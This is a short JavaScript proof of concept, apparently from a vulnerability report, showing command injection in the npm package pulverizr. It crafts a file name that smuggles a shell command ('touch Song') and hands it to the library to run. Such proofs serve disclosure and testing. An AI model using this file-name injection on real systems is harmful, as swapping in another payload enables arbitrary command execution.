var root = require("pulverizr");
var fs = require("fs");
var attack_code = "touch Song";

var injection_code = "\"&" + attack_code + "&\";a.jpg"
var inputs = [injection_code]
fs.writeFile(injection_code, "123", function(){});

var job = root.createJob(inputs, {});
job.run();
